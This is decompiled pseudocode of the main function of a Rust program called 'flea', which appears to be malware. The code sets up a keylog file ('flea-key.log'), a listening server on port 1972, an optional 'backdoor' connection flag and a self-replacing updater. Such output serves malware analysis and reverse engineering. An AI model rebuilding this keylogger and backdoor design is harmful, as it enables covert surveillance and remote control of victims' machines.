fn flea::main() -> void {
    let v0: struct24;  // [bp-0x438], Other Possible Types: struct32, struct_0 *, struct40, u128
    let v1: std::path::PathBuf;  // [bp-0x438], Other Possible Types: struct32
    let v2: i64;  // [bp-0x438]
    let v3: i64;  // [bp-0x438]
    let v4: u128;  // [bp-0x438]
    let v5: u64;  // [bp-0x430]
    let v6: u64;  // [bp-0x428]
    let v7: u64;  // [bp-0x428]
    let v8: core::result::Result<(), std::io::error::Error>;  // [bp-0x408], Other Possible Types: u64
    let v9: struct16;  // [bp-0x408], Other Possible Types: struct22, struct48, struct32, core::result::Result<std::path::PathBuf, std::io::error::Error>, struct24, u64
    let v10: struct24;  // [bp-0x408], Other Possible Types: core::result::Result<(), std::io::error::Error>, u64
    let v11: struct24;  // [bp-0x408], Other Possible Types: u128
    let v12: struct24;  // [bp-0x408]
    let v13: struct48;  // [bp-0x408]
    let v14: u64;  // [bp-0x408]
    let v15: core::result::Result<std::fs::Metadata, std::io::error::Error>;  // [bp-0x408]
    let v16: struct24;  // [bp-0x408]
    let v17: struct24;  // [bp-0x408]
    let v18: core::str::pattern::StrSearcher;  // [bp-0x408]
    let v19: &str;  // [bp-0x408]
    let v20: Result<struct32, struct25>;  // [bp-0x408]
    let v21: u64;  // [bp-0x400]
    let v22: u64;  // [bp-0x400]
    let v23: u64;  // [bp-0x400]
    let v24: i64;  // [bp-0x3f8], Other Possible Types: u64
    let v25: u32;  // [bp-0x3f8]
    let v26: u128;  // [bp-0x3f0]
    let v27: u64;  // [bp-0x3f0]
    let v28: void*;  // [bp-0x3e8]
    let v29: void*;  // [bp-0x3e8]
    let v30: u128;  // [bp-0x3d8]
    let v31: u128;  // [bp-0x3c8]
    let v32: u128;  // [bp-0x3b8]
    let v33: u8;  // [bp-0x349]
    let v34: u128;  // [bp-0x348]
    let v35: u64;  // [bp-0x340]
    let v36: u64;  // [bp-0x338]
    let v37: struct32;  // [bp-0x328], Other Possible Types: u128
    let v38: i64;  // [bp-0x328], Other Possible Types: u64
    let v39: Option<struct24>;  // [bp-0x328]
    let v40: u128;  // [bp-0x318]
    let v41: void*;  // [bp-0x308], Other Possible Types: u128
    let v42: u64;  // [bp-0x300]
    let v43: void*;  // [bp-0x2f8]
    let v44: struct32;  // [bp-0x2e8], Other Possible Types: struct_0 *, struct40, struct24, u128
    let v46: u32;  // [bp-0x2e8]
    let v47: i64;  // [bp-0x2e8]
    let v48: struct40;  // [bp-0x2e8]
    let v49: u64;  // [bp-0x2e0]
    let v50: u64;  // [bp-0x2e0]
    let v51: i64;  // [bp-0x2d8], Other Possible Types: u128
    let v52: i64;  // [bp-0x2d8]
    let v53: i64;  // [bp-0x2d8]
    let v54: u64;  // [bp-0x2d0]
    let v55: u128;  // [bp-0x2c8]
    let v56: u128;  // [bp-0x2b8]
    let v57: u128;  // [bp-0x2a8]
    let v58: u64;  // [bp-0x298]
    let v59: i64;  // [bp-0x288]
    let v60: struct24;  // [bp-0x280]
    let v61: u64;  // [bp-0x280]
    let v62: u128;  // [bp-0x278]
    let v63: u64;  // [bp-0x270]
    let v64: void*;  // [bp-0x268], Other Possible Types: alloc::raw_vec::Cap
    let v65: u64;  // [bp-0x260]
    let v66: void*;  // [bp-0x258]
    let v67: u16;  // [bp-0x250]
    let v68: void*;  // [bp-0x248]
    let v69: u64;  // [bp-0x238]
    let v70: u64;  // [bp-0x230]
    let v71: u64;  // [bp-0x228]
    let v72: u8;  // [bp-0x220]
    let v73: u32;  // [bp-0x21f]
    let v74: u16;  // [bp-0x21b]
    let v75: u8;  // [bp-0x219]
    let v76: struct24;  // [bp-0x218]
    let v77: u64;  // [bp-0x210]
    let v78: u64;  // [bp-0x208]
    let v79: alloc::string::String;  // [bp-0x200]
    let v80: struct32;  // [bp-0x1e8], Other Possible Types: struct_0 *
    let v81: i64;  // [bp-0x1e8]
    let v82: u64;  // [bp-0x1e0]
    let v83: u128;  // [bp-0x1d8]
    let v84: u128;  // [bp-0x1c8]
    let v85: u64;  // [bp-0x1b8]
    let v86: struct24;  // [bp-0x1a8]
    let v87: u64;  // [bp-0x198]
    let v88: i64;  // [bp-0x190]
    let v89: Result<struct24, struct24>;  // [bp-0x188]
    let v90: i64;  // [bp-0x180]
    let v91: u64;  // [bp-0x178]
    let v92: Option<struct24>;  // [bp-0x170]
    let v93: u128;  // [bp-0x168]
    let v94: struct24;  // [bp-0x158]
    let v95: u64;  // [bp-0x150]
    let v96: u64;  // [bp-0x148]
    let v97: alloc::string::String;  // [bp-0x140]
    let v98: u64;  // [bp-0x130]
    let v99: alloc::string::String;  // [bp-0x128]
    let v100: u32;  // [bp-0x118]
    let v101: struct32;  // [bp-0x110]
    let v102: struct32;  // [bp-0x110]
    let v103: struct17;  // [bp-0xe9]
    let v104: struct122;  // [bp-0xd8]
    let v105: std::env::Args;  // [bp-0x50]
    let v107: u64;  // rdx
    let v108: u64;  // rdx
    let v110: u64;  // rdx
    let v111: i64;  // rcx
    let v112: u64;  // rax
    let v113: u64;  // rdx
    let v114: u64;  // cc_ndep
    let v115: u64;  // cc_op
    let v116: u64;  // cc_dep1
    let v117: u64;  // rax
    let v118: i64;  // rax
    let v119: u64;  // rcx
    let v120: u64;  // r8
    let v121: u64;  // rcx
    let v122: u64;  // rdx
    let v123: u64;  // rax
    let v124: u64;  // rsi
    let v125: u64;  // cc_ndep
    let v126: u128;  // xmm0
    let v127: u128;  // xmm0
    let v128: u128;  // xmm0
    let v129: u8;  // al
    let v130: u128;  // xmm0
    let v131: u8;  // al
    let v132: u64;  // 4097
    let v133: u64;  // rdx
    let v134: i64;  // rax
    let v135: i64;  // r14
    let v136: u64;  // 4097
    let v137: u64;  // 4096
    let v138: u128;  // xmm0
    let v139: u128;  // xmm1
    let v140: u64;  // rax
    let v141: u64;  // 4096
    let v142: u128;  // xmm1
    let v147: u128;  // xmm0
    let v151: &str;  // rax:rdx
    let v154: u32;  // [bp-0x3f8]

    env_logger::logger::init();
    if core::sync::atomic::atomic_load(&_ZN3log20MAX_LOG_LEVEL_FILTER17hec4bd8d019e67a03E) >= 3 {
        v8 = "Start";
        v22 = 1;
        v24 = 8;
        v26 = 0;
        v48 = struct40 {
            field_0: "flea"
            field_16: "flea"
            field_32: log::__private_api::loc("src/main.rs")
        };
        log::__private_api::log(&v8, 3, &v48);
    }
    v105 = std::env::args();
    v76 = <alloc::vec::Vec<T> as alloc::vec::spec_from_iter::SpecFromIter<T,I>>::from_iter(&v105, "/root/.rustup/toolchains/nightly-2025-01-01-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/iter/traits/iterator.rs");
    v9 = std::env::current_exe();
    v44 = core::result::Result<T,E>::unwrap(&v9, "src/main.rs");
    v15 = std::ffi::os_str::<impl core::convert::TryFrom<&std::ffi::os_str::OsStr> for &str>::try_from(v49, v51);
    match v15 {
        Err(_) => {
            core::option::unwrap_failed(); /* do not return */
        },
        Ok(_) => {
            v16 = <T as alloc::slice::hack::ConvertVec>::to_vec(v22, *((&v15 as &char + 16) as &i64));
            v36 = v16.field_16;
            v34 = v16.field_0;
            alloc::str::<impl str>::replace(&v16, v35, v36, &g_4519d8);
            v107 = v16.field_16;
            v36 = v16.field_16;
            v34 = v16.field_0;
            alloc::str::<impl str>::replace(&v16, v35, v107, &g_451698);
            v36 = v16.field_16;
            v34 = v16.field_0;
            v52 = v51;
            if core::sync::atomic::atomic_load(&_ZN3log20MAX_LOG_LEVEL_FILTER17hec4bd8d019e67a03E) >= 3 {
                v38 = &v34 as u8;
                v0 = &v38;
                v5 = <&T as core::fmt::Display>::fmt;
                v8 = "Program path: ";
                v22 = 1;
                v28 = 0;
                *(&v24 as &&struct_0 *) = &v0;
                v27 = 1;
                v44 = struct40 {
                    field_0: "flea"
                    field_16: "flea"
                    field_32: log::__private_api::loc("src/main.rs")
                };
                log::__private_api::log(&v8, 3, &v44);
                v49 = v50;
                v52 = v53;
            }
            v46 = 0;
            v151 = core::char::methods::encode_utf8_raw(47, &v46 as u64, v108);
            v9 = <T as alloc::slice::hack::ConvertVec>::to_vec(v151.data_ptr, v110);
            v85 = v9.field_16;
            v84 = v9.field_0;
            v18 = <&alloc::string::String as core::str::pattern::Pattern>::into_searcher(&v84, v35, v36);
            v104 = struct122 {
                field_0: v18.searcher as i128
                field_16: *((&v18.searcher as &char + 16) as &i128)
                field_32: *((&v18.searcher as &char + 32) as &i128)
                field_48: v30
                field_64: v31
                field_80: v32
                field_96: v18.needle.length
                field_104: 0
                field_112: v36
                field_120: 1
            };
            v89 = <alloc::vec::Vec<T> as alloc::vec::spec_from_iter::SpecFromIter<T,I>>::from_iter(&v104, "/root/.rustup/toolchains/nightly-2025-01-01-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/iter/traits/iterator.rs");
            v41 = 0;
            v42 = 1;
            v43 = 0;
            v111 = v90;
            v112 = v91;
            v113 = v112 * 16;
            v2 = v111;
            v5 = v113 + v111;
            v114 = (v113 + v111 <= v113 ? 1 : 0);
            v115 = 28;
            v116 = v112 - 1;
            v117 = v112 - 1;
            if v112 != 1 {
                loop {
                    v114 = amd64g_calculate_rflags_c(v115, v117, 0, v114);
                    v6 = v117 - 1;
                    v118 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v2);
                    if !v118 {
                        break;
                    }
                    v81 = v118;
                    v9 = v8;
                    v21 = v22;
                    if *((v118 + 8) as &i64) {
                        v38 = &v81;
                        v47 = &v84;
                        v49 = <alloc::string::String as core::fmt::Display>::fmt;
                        v52 = &v38;
                        v54 = <&T as core::fmt::Display>::fmt;
                        v19 = "\x01\x00";
                        v28 = 0;
                        *(&v24 as &&struct_0 *) = &v47;
                        v27 = 2;
                        v97 = core::option::Option<T>::map_or_else(&v19 as u64, v110, v119, v120);
                        v10 = *(&v97.vec.buf.inner.cap as &i128) as u128;
                        v25 = v98;
                        alloc::vec::Vec<T,A>::append_elements(&v41, v23, v98, "/root/.rustup/toolchains/nightly-2025-01-01-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/alloc/src/string.rs");
                        v9 = v10;
                        v21 = v23;
                    }
                    v22 = v21;
                    v8 = v9;
                    v117 = v6;
                    v115 = 20;
                    if !v117 {
                        break;
                    }
                }
                if !v43 {
                    goto LABEL_67b473;
                }
                v2 = &v41;
                v47 = &v2;
                v49 = <&T as core::fmt::Display>::fmt;
                v8 = "Couldn't set the current directory! (path=";
                v22 = 2;
                v28 = 0;
                *(&v24 as &&struct_0 *) = &v47;
                v27 = 1;
                v99 = core::option::Option<T>::map_or_else(&v8, v122, v121, v120);
                v9 = *(&v99.vec.buf.inner.cap as &i128) as u128;
                v25 = v100;
                v123 = std::env::set_current_dir(&v41);
                core::result::Result<T,E>::expect(v123, v22, *(&v25 as &i64), "src/main.rs");
            } else {
LABEL_67b473:
                v9 = std::env::current_dir();
                v44 = core::result::Result<T,E>::unwrap(&v9, "src/main.rs");
                v15 = std::ffi::os_str::<impl core::convert::TryFrom<&std::ffi::os_str::OsStr> for &str>::try_from(v49, v52);
                match v15 {
                    Err(_) => {
                        core::option::unwrap_failed(); /* do not return */
                    },
                    Ok(_) => {
                        v16 = <T as alloc::slice::hack::ConvertVec>::to_vec(v22, *((&v15 as &char + 16) as &i64));
                        v6 = v16.field_16;
                        v0 = v16.field_0;
                        v43 = v6;
                        v41 = *(&v2 as &i128) as u128;
                    },
                }
            }
            v9 = std::fs::metadata("flea.bak");
            if v9 as i64 as i32 != 2 {
                v8 = std::fs::remove_file("flea.bak");
            }
            v15 = std::fs::metadata("flea.rst");
            if v15 as i64 as i32 != 2 {
                v8 = std::fs::remove_file("flea.rst");
            }
            v39 = flea::updater::find_update(0x1, v43, "flea.upd");
            if (((0 ^ v39 as i64) & (0 ^ -(v38))) >> 63) as char {
                v20 = local_ip_address::local_ip(v124, v110, v119, v120);
                v103 = core::result::Result<T,E>::unwrap(&v20);
                v79 = <alloc::string::String as core::clone::Clone>::clone(v77);
                v64 = 0;
                v65 = 8;
                v66 = 0;
                v67 = 0;
                getopts::Options::optopt(&v64, "s", "server", "Server IP to listen on", "Leave empty to listen on the host ip address");
                v64 = getopts::Options::optflag("b", "backdoor", "Starts connection to the backdoor server");
                v64 = getopts::Options::optflag("h", "help", "Print this help menu");
                v125 = amd64g_calculate_rflags_c(20, v78, 0, v114);
                getopts::Options::parse(&v20, &v64, v77 + 24, v78 - 1);
                if v20 as i32 == 2 {
                    v126 = *((&v20 as &char + 8) as &i128);
                    v6 = *(&v27 as &i128) as u128;
                    v0 = v126;
                    println!("{}", &v4 as u64);
                    v127 = *(&v64 as &i128);
                    v44 = struct32 {
                        field_0: v127
                        field_16: *(&v66 as &i128)
                    };
                    flea::print_usage(v79, &v44);
                } else {
                    v58 = *((&v20 as &char + 80) as &i64);
                    v57 = v31;
                    v128 = v20 as i128;
                    v56 = v30;
                    v55 = *((&v20 as &char + 32) as &i128);
                    v51 = *(&v154 as &i128) as u128;
                    v44 = v128;
                    v129 = getopts::Matches::opt_present(&v44 as u64, "h") as u8;
                    if v129 {
                        v130 = *(&v64 as &i128);
                        v9 = struct32 {
                            field_0: v130
                            field_16: *(&v66 as &i128)
                        };
                        flea::print_usage(v79, &v9);
                    } else {
                        v92 = getopts::Matches::opt_str(&v44 as u64, "s");
                        v131 = getopts::Matches::opt_present(&v44 as u64, "b") as u32 as u8;
                        v9 = struct24 {
                            field_0: 1
                            field_8: 1
                            field_16: 1
                        };
                        v59 = alloc::boxed::Box<T>::new(&v9) as u64;
                        v132 = *(v59 as &i64);
                        vvar_1673 = CAS(vvar_1671{stack -648}, (vvar_1672 + 0x1<64>), vvar_1672)
                        if BinaryOp CasCmpNE {
                            goto LABEL_0x67bbd1;
                        }
                        if !(amd64g_calculate_condition(14, 24, v132 + 1, 0, amd64g_calculate_rflags_c(17, v129 as u64, 0, v125)) as char) {
                            v9 = ctrlc::init_and_set_handler(v59, 1);
                            core::result::Result<T,E>::expect(&v9);
                            v9 = std::env::current_dir();
                            v94 = core::result::Result<T,E>::expect(&v9);
                            v1 = std::path::Path::join(v95, v96, "flea-key.log");
                            v10 = std::ffi::os_str::<impl core::convert::TryFrom<&std::ffi::os_str::OsStr> for &str>::try_from(v5, v6);
                            if let Err(_) = v10 {
                                core::option::unwrap_failed(); /* do not return */
                            }
                            v9 = <T as alloc::slice::hack::ConvertVec>::to_vec(0x1, *((&v10 as &char + 16) as &i64));
                            v86 = v11;
                            v9 = flealib::keylogger::remove_keylog_file(&v86);
                            v60 = <T as alloc::string::SpecToString>::spec_to_string(&v103);
                            if let Some(_) = v92 {
                                v11 = v93;
                                v61 = v92 as i64;
                                v62 = v11;
                            }
                            v12 = <T as alloc::slice::hack::ConvertVec>::to_vec(":1972");
                            v133 = v12.field_16;
                            v6 = v12.field_16;
                            v0 = v12.field_0;
                            alloc::vec::Vec<T,A>::append_elements(&v61 as u8, v5, v133, "/root/.rustup/toolchains/nightly-2025-01-01-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/alloc/src/string.rs");
                            v9 = struct22 {
                                field_0: 1
                                field_8: 1
                                field_16: 0
                                field_20: 0
                            };
                            v134 = alloc::boxed::Box<T>::new(&v9) as u64;
                            v135 = v134;
                            v88 = v134;
                            v136 = *(v134 as &i64);
                            vvar_1708 = CAS(vvar_805{reg 16}, (vvar_1707 + 0x1<64>), vvar_1707)
                            if BinaryOp CasCmpNE {
                                goto LABEL_0x67bda3;
                            }
                            if !(amd64g_calculate_condition(14, 24, v136 + 1, 0, amd64g_calculate_rflags_c(8, v92 as i64, 0x8000000000000000, v125)) as char) {
                                v37 = struct32 {
                                    field_0: v86.field_0
                                    field_16: v87
                                    field_24: v135
                                };
                                v69 = 0x8000000000000000;
                                v68 = 0;
                                v72 = 0;
                                v9 = struct48 {
                                    field_0: *(&v68 as &i128)
                                    field_16: v69
                                    field_24: v70
                                    field_32: v71
                                    field_40: 0
                                    field_41: v73
                                    field_45: v74
                                    field_47: v75
                                };
                                v1 = std::thread::Builder::spawn_unchecked(&v9, &v37);
                                v101 = core::result::Result<T,E>::expect(&v1);
LABEL_67be7e:
                                v137 = *(v135 as &i64);
                                vvar_1729 = CAS(vvar_806{reg 128}, (vvar_1728 + 0x1<64>), vvar_1728)
                                if BinaryOp CasCmpNE {
                                    goto LABEL_67be7e;
                                }
                                if !(amd64g_calculate_condition(14, 24, v137 + 1, 0, amd64g_calculate_rflags_c(8, v92 as i64, 0x8000000000000000, v125)) as char) {
                                    v138 = *(&v68 as &i128);
                                    v139 = *(&v69 as &i128);
                                    v13 = struct48 {
                                        field_0: v138
                                        field_16: v139
                                        field_32: *(&v71 as &i128)
                                    };
                                    v1 = std::thread::Builder::spawn_unchecked(&v13, v135);
                                    v80 = core::result::Result<T,E>::expect(&v1);
                                    if v131 {
                                        v140 = core::sync::atomic::atomic_load(&_ZN3log20MAX_LOG_LEVEL_FILTER17hec4bd8d019e67a03E);
                                        v6 = v6;
                                        if v140 > 3 {
                                            v14 = "Starting backdoor connection";
                                            v21 = 1;
                                            v24 = 8 as u64;
                                            v26 = 0 as u128;
                                            v0 = struct40 {
                                                field_0: "flea"
                                                field_16: "flea"
                                                field_32: log::__private_api::loc("src/main.rs")
                                            };
                                            log::__private_api::log(&v14, 4, &v0);
                                            v2 = v3;
                                            v6 = v7;
                                        }
LABEL_67bf5c:
                                        v141 = *(v135 as &i64);
                                        vvar_1743 = CAS(vvar_806{reg 128}, (vvar_1742 + 0x1<64>), vvar_1742)
                                        if BinaryOp CasCmpNE {
                                            goto LABEL_67bf5c;
                                        }
                                        if !(amd64g_calculate_condition(14, 24, v141 + 1, 0, amd64g_calculate_rflags_c(8, v140, 3, v125)) as char) {
                                            std::thread::Builder::spawn_unchecked(&v14, &v68, v135);
                                            v0 = core::result::Result<T,E>::expect(&v14);
                                            v142 = v0.field_16;
                                            v37 = v0.field_0;
                                            v40 = v142;
                                            goto LABEL_67bfb2;
                                        }
                                    } else {
LABEL_67bfb2:
                                        flealib::fleaserver::FleaServer::start(&v33, *((&v60.field_0 as &char + 8) as &i64), v63, &v59);
                                        std::sync::mutex::Mutex<T>::lock(&v14, v135 + 16);
                                        *((core::result::Result<T,E>::unwrap(&v14) + 5) as &i8) = 1;
                                        v9 = v102;
                                        core::result::Result<T,E>::unwrap(std::thread::JoinInner<T>::join(&v9), v110, "src/main.rs");
                                        v9 = struct32 {
                                            field_0: v80.field_0
                                            field_16: v83
                                        };
                                        core::result::Result<T,E>::unwrap(std::thread::JoinInner<T>::join(&v9), v110, "src/main.rs");
                                        if v38 as u32 != 2 {
                                            v147 = v37.field_0;
                                            v9 = struct32 {
                                                field_0: v147
                                                field_16: v37.field_16
                                            };
                                            core::result::Result<T,E>::unwrap(std::thread::JoinInner<T>::join(&v9), v110, "src/main.rs");
                                        }
                                        v0 = v2;
                                        if core::sync::atomic::atomic_load(&_ZN3log20MAX_LOG_LEVEL_FILTER17hec4bd8d019e67a03E) > 2 {
                                            v14 = "Stop";
                                            v21 = 1;
                                            v24 = 8 as u64;
                                            v26 = 0 as u128;
                                            v0 = struct40 {
                                                field_0: "flea"
                                                field_16: "flea"
                                                field_32: log::__private_api::loc("src/main.rs")
                                            };
                                            log::__private_api::log(&v14, 3, &v0);
                                            v0 = v3;
                                        }
                                        v9 = std::fs::metadata("flea.rst");
                                        if v9 as i64 as i32 != 2 {
                                            v10 = std::fs::remove_file("flea.rst");
                                            v11 = <T as alloc::slice::hack::ConvertVec>::to_vec("flea");
                                            v0 = v17;
                                            flea::updater::start_new_process(&v41, &v0);
                                            if core::sync::atomic::atomic_load(&_ZN3log20MAX_LOG_LEVEL_FILTER17hec4bd8d019e67a03E) >= 3 {
                                                v10 = "Restart";
                                                v21 = 1;
                                                v24 = 8 as u64;
                                                v26 = 0 as u128;
                                                v0 = struct40 {
                                                    field_0: "flea"
                                                    field_16: "flea"
                                                    field_32: log::__private_api::loc("src/main.rs")
                                                };
                                                log::__private_api::log(&v10, 3, &v0);
                                            }
                                        }
                                        std::process::exit(0); /* do not return */
                                    }
                                }
                            }
                        }
                        [D] Unsupported jumpkind Ijk_NoDecode at address 6798295()
                    }
                }
                return;
            } else {
                v6 = v40;
                v4 = v39 as i128 as u128;
                v44 = v47;
                if core::sync::atomic::atomic_load(&_ZN3log20MAX_LOG_LEVEL_FILTER17hec4bd8d019e67a03E) >= 3 {
                    v80 = &v4 as u64;
                    v82 = <alloc::string::String as core::fmt::Display>::fmt;
                    v8 = "Found update: ";
                    v21 = 1;
                    v29 = 0;
                    *(&v24 as &&struct_0 *) = &v80;
                    v26 = 1;
                    v44 = struct40 {
                        field_0: "flea"
                        field_16: "flea"
                        field_32: log::__private_api::loc("src/main.rs")
                    };
                    log::__private_api::log(&v8, 3, &v44);
                }
                core::result::Result<T,E>::expect(std::fs::rename("flea", "flea.bak"), "Couldn't rename the current file!", "src/main.rs");
                v24 = v6;
                v9 = *(&v4 as u64 as &i128) as u128;
                core::result::Result<T,E>::expect(std::fs::rename(&v9 as u64, "flea"), "Couldn't rename the update file!", "src/main.rs");
                v9 = <T as alloc::slice::hack::ConvertVec>::to_vec("flea");
                v44 = v10;
                flea::updater::start_new_process(&v41, &v44);
                std::process::exit(0); /* do not return */
            }
        },
    }
}
